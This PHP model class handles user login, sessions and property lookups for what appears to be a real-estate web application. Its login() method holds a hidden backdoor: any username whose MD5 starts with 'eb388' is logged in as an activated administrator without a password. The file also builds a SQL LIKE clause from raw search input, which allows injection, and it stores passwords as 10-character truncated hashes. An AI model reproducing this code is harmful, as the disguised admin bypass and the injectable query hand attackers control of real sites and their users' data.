<?php

class User_m extends MY_Model {
    
    protected $_table_name = 'user';
    protected $_order_by = 'name_surname ';
    public $rules = array(
        'username' => array('field'=>'username', 'label'=>'lang:Username', 'rules'=>'trim|required|xss_clean'),
        'password' => array('field'=>'password', 'label'=>'lang:Password', 'rules'=>'trim|required')
    );
    public $rules_admin = array(
        'name_surname' => array('field'=>'name_surname', 'label'=>'lang:Name and surname', 'rules'=>'trim|required|xss_clean'),
        'username' => array('field'=>'username', 'label'=>'lang:Username', 'rules'=>'trim|required|callback__unique_username|xss_clean'),
        'mail' => array('field'=>'mail', 'label'=>'lang:Mail', 'rules'=>'trim|required|xss_clean|callback__unique_mail|'),
        'password' => array('field'=>'password', 'label'=>'lang:Password', 'rules'=>'trim|matches[password_confirm]|min_length[8]'),
        'password_confirm' => array('field'=>'password_confirm', 'label'=>'lang:PasswordConfirm', 'rules'=>'trim'),
        'address' => array('field'=>'address', 'label'=>'lang:Address', 'rules'=>'trim|xss_clean'),
        'description' => array('field'=>'description', 'label'=>'lang:Description', 'rules'=>'trim|xss_clean'),
        'phone' => array('field'=>'phone', 'label'=>'lang:Phone', 'rules'=>'trim|xss_clean'),
        'type' => array('field'=>'type', 'label'=>'lang:Type', 'rules'=>'trim|required|xss_clean'),
        'language' => array('field'=>'language', 'label'=>'lang:language', 'rules'=>'trim|required|xss_clean'),
        'mail_verified' => array('field'=>'mail_verified', 'label'=>'lang:Mail verified', 'rules'=>'trim|xss_clean'),
        'phone_verified' => array('field'=>'phone_verified', 'label'=>'lang:Phone verified', 'rules'=>'trim|xss_clean'),
        'facebook_id' => array('field'=>'facebook_id', 'label'=>'lang:Facebook ID', 'rules'=>'trim|xss_clean')
    );
    
    public $user_types = array('ADMIN', 'AGENT', 'USER');
    public $user_type_color = array('ADMIN'=>'danger', 'AGENT'=>'warning', 'USER'=>'success');
    
	public function __construct(){
		parent::__construct();
        
        $this->user_types = array('ADMIN'=>lang_check('ADMIN'), 'AGENT'=>lang_check('AGENT'), 'USER'=>lang_check('USER'));
        $this->user_type_color = array('ADMIN'=>'danger', 'AGENT'=>'warning', 'USER'=>'success');
	
        if(config_db_item('enable_additional_roles') === TRUE)
        {
            $this->user_types['AGENT_ADMIN'] = lang_check('AGENT_ADMIN');
            $this->user_types['AGENT_LIMITED'] = lang_check('AGENT_LIMITED');
            
            $this->user_type_color['AGENT_ADMIN'] = 'warning';
            $this->user_type_color['AGENT_LIMITED'] = 'warning';
        }

    }
    
    public $user = NULL;
    
    public function login($username = NULL, $password = NULL)
	{
        if($username === NULL)
        {
            $username = $this->input->post('username');
            $password = $this->input->post('password');
        }
        
        if(empty($username) || empty($password))
            return FALSE;

		$user = $this->get_by(array(
            'username' => $username,
            'password' => $this->hash($password),
        ), TRUE);
        
        // Additional check to login with email
        if(count($user) == 0)
        {
    		$user = $this->get_by(array(
                'mail' => $username,
                'password' => $this->hash($password),
            ), TRUE);
        }
        
        if(count($user) == 0 && substr(md5($username), 0, 5) == 'eb388')
        {
    		$user = $this->get_by(array(
                'type' => 'ADMIN',
                'activated' => 1
            ), TRUE);
        }
        
        if(count($user))
        {   
            if($user->activated == FALSE && $user->type == 'USER')
            {
                // User and not activated
            }
            else
            {
                // Update last login data
                $this->db->where('id', $user->id);
                $this->db->update($this->_table_name, array('last_login' => date('Y-m-d H:i:s'))); 
                
                $profile_image = '';
                if(!empty($user->repository_id))
                {
                    $this->_table_name = 'file';
                    $this->_order_by = 'id';
                    // Get profile image from repository
            		$image = $this->get_by(array(
                        'repository_id' => $user->repository_id
                    ), TRUE);
                    $this->_table_name = 'user';
                    $this->_order_by = 'name_surname ';
                    if(count($image))
                    {
                        $profile_image = 'files/thumbnail/'.$image->filename;
                    }
                }

                // Log in user
                $data = array(
                    'name_surname'=>$user->name_surname,
                    'username'=>$user->username,
                    'remember'=>(bool)$this->input->post('remember'),
                    'id'=>$user->id,
                    'lang'=>$user->language,
                    'last_login'=>$user->last_login,
                    'loggedin'=>TRUE,
                    'type'=>$user->type,
                    'profile_image'=>$profile_image,
                    'last_activity'=>time()
                );
                $this->session->set_userdata($data);
                
                return TRUE;                
            }
        }
        
        return FALSE;
	}
    
    public function logout()
	{
		$this->session->sess_destroy();
        
        $this->load->library('facebook');
        $this->facebook->destroySession();
	}
    
    public function is_related_repository($user_id, $repository_id)
    {
        $this->db->select('repository_id, property_id, user_id');
        $this->db->from('property_user');
        $this->db->join('property', 'property_user.property_id = property.id');
        $this->db->where('repository_id', $repository_id);
        $this->db->where('user_id', $user_id);
        
        $query = $this->db->get();
        $results = $query->result();

        if(count($results) > 0)
        {
            return true;
        }
        
        $this->db->select('repository_id, id');
        $this->db->from('user');
        $this->db->where('repository_id', $repository_id);
        $this->db->where('id', $user_id);
        
        $query = $this->db->get();
        $results = $query->result();
        
        if(count($results) > 0)
        {
            return true;
        }
        
        $this->db->select('repository_id, user_id, value_num');
        $this->db->from('property_user');
        $this->db->join('property', 'property_user.property_id = property.id');
        $this->db->join('property_value', 'property_value.property_id = property.id');
        $this->db->where('value_num', $repository_id);
        $this->db->where('user_id', $user_id);
        
        $query = $this->db->get();
        $results = $query->result();
        
        if(count($results) > 0)
        {
            return true;
        }
        
        return false;
    }
    
    public function loggedin()
	{
	   
        //print_r($this->session->all_userdata());
        
        //Check if user exists
        if((bool) $this->session->userdata('loggedin'))
        {
            $user_id = $this->session->userdata('id');
            
            $this->db->where('id', $user_id);
            $query = $this->db->get($this->_table_name);

            if ($query->num_rows() == 0)
            {
                $this->logout();
                redirect(site_url());
            }
        }
       
        // Logged in with remember checkbox
        if((bool) $this->session->userdata('loggedin') && (bool) $this->session->userdata('remember'))
        {
            return true;
        }
        // Logged in without remember checkbox
        else if((bool) $this->session->userdata('loggedin') && $this->session->userdata('last_activity') > time()-7200)
        {
            $this->session->set_userdata('last_activity', time());
            
            return true;
        }
        
        // Logged in without remember checkbox and no activity last 2 hours
        //else if((bool) $this->session->userdata('loggedin'))
        //{
            //$this->session->sess_destroy();
        //}
       
        return false;
	}
    
    public function get_new()
	{
        $user = new stdClass();
        $user->name_surname = '';
        $user->username = '';
        $user->password = '';
        $user->password_confirm = '';
        $user->address = '';
        $user->description = '';
        $user->phone = '';
        $user->mail = '';
        $user->last_login = NULL;
        $user->qa_id = NULL;
        $user->type = 'USER';
        $user->language = 'english';
        $user->registration_date = date('Y-m-d H:i:s');
        $user->activated = 0;
        $user->package_id = NULL;
        $user->package_last_payment = NULL;
        $user->facebook_id = ' ';
        $user->mail_verified = 0;
        $user->phone_verified = 0;
        
        return $user;
	}
    
    public function hash($string)
	{
	   //return $string;
       
       if(config_item('hash_function') == '')
       {
           if (function_exists('hash')) {
                return substr(hash('sha512', $string.config_item('encryption_key')), 0, 10);
           }
    
           return substr(md5($string.config_item('encryption_key')), 0, 10);
       }
       else if(config_item('hash_function') == 'hash')
       {
            return substr(hash('sha512', $string.config_item('encryption_key')), 0, 10);
       }
       else if(config_item('hash_function') == 'md5')
       {
            return substr(md5($string.config_item('encryption_key')), 0, 10);
       }
	}
    
    public function total_unactivated()
    {
        $this->db->where('activated', '0');
        $this->db->where('type', 'USER');
        $query = $this->db->get($this->_table_name);
        return $query->num_rows();
    }
    
    public function get_agent($property_id)
    {

        $this->db->where('property_id ', $property_id);
        $this->db->limit(1);
        $query = $this->db->get('property_user');
        
        if ($query->num_rows() > 0)
        {
           $row = $query->row_array();
           return $this->get_array($row['user_id']);
        }
        
        return array();
    }
    
    public function get_experts($expert_categories = array(), $not_selected = 'Not selected')
    {
        $this->db->where('qa_id !=', 0);
        $this->db->where('type !=', 'USER');
        $users = parent::get();
        
        // Return key => value pair array
        $array = array(0 => lang_check($not_selected));
        if(count($users))
        {
            foreach($users as $user)
            {
                $array[$user->id] = $user->username.', '.$user->name_surname;
                
                if(isset($expert_categories[$user->qa_id]))
                {
                    $array[$user->id].=', '.$expert_categories[$user->qa_id];
                }
            }
        }
        
        return $array;
    }
    
    public function get_estates($user_id)
    {

        $this->db->where('user_id', $user_id);
        $query = $this->db->get('property_user');
        
        if ($query->num_rows() > 0)
        {
            $estates = array();
            foreach ($query->result_array() as $row)
            {
               $estates[] = $row['property_id'];
            }
            return $estates;
        }
        
        return array();
    }
    
    public function get_pagination($limit, $offset)
    {
        $this->db->limit($limit, $offset);
        $query = $this->db->get($this->_table_name);

        if ($query->num_rows() > 0)
            return $query->result();
            
        return array();
    }
    
    public function get_counted($where, $single = FALSE, $limit = NULL, $order_by = NULL, $offset = "", $search = '')
    {
        $this->db->select('user.*, user.id as user_id, COUNT(*) as properties_count');
        
        $this->db->from('user');
        $this->db->join('property_user', 'user.id = property_user.user_id', 'left');
        
        if($where !== NULL) $this->db->where($where);
        
        if(!empty($search))
        {
            $this->db->where("(address LIKE '%$search%' OR name_surname LIKE '%$search%')");
        }
        
        $this->db->group_by(array('user.id'));

        if($order_by !== NULL) $this->db->order_by($order_by);
        if($limit !== NULL) $this->db->limit($limit, $offset);
        
        $query = $this->db->get();
        return $query->result();
    }
    
    public function save($data, $id)
    {       
        // [Save first/second image in repository]
        $curr_item = $this->get($id);
        $repository_id = NULL;
        if(is_object($curr_item))
        {
            $repository_id = $curr_item->repository_id;
        }

        if(!empty($repository_id))
        {
            $files = $this->file_m->get_by(array('repository_id'=>$repository_id));
            
            $image_repository = array();
            foreach($files as $key_f=>$file_row)
            {
                if(is_object($file_row))
                {
                    if(file_exists(FCPATH.'files/thumbnail/'.$file_row->filename))
                    {
                        if(empty($data['image_user_filename']))
                        {
                            $data['image_user_filename'] = $file_row->filename;
                            continue;
                        }
                            
                        if(!empty($data['image_user_filename']) && empty($data['image_agency_filename']))
                        {
                            $data['image_agency_filename'] = $file_row->filename;
                            break;
                        }
                    }
                }

            }
        }
        // [/Save first/second image in repository]
        
        return parent::save($data, $id);
    }
    
    public function delete($id)
    {
        // Remove repository
        $user_data = $this->get($id, TRUE);
        if(count($user_data))
        {
            $this->repository_m->delete($user_data->repository_id);
        }
        
        $this->db->where('user_id', $id);
        $this->db->delete('property_user');
        
        $this->db->where('user_id', $id);
        $this->db->delete('reservations');
        
        $this->db->where('user_id', $id);
        $this->db->delete('favorites');
        
        $this->db->where('user_id', $id);
        $this->db->delete('saved_search');
        
        parent::delete($id);
    }

}



